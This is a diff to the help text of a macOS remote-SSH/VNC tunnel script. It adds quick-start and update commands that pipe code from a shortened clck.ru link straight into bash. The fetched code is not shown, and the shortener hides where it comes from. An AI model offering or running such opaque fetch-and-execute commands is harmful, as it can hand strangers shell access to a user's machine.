@@ -2442,6 +2442,12 @@ Zero-config remote SSH (and optional VNC) for macOS, via a Pinggy tunnel.
 Usage:
   bridge.sh [command] [options]
 
+Quick start:
+  bash -c "$(curl -fsSL https://clck.ru/3VCyvf)"
+
+Force restart / update:
+  bash -c "$(curl -fsSL https://clck.ru/3VCyvf)" -- --force
+
 Commands:
   start       Enable Remote Login and open a background tunnel (default)
   stop        Close the tunnel (does not disable SSH/VNC)
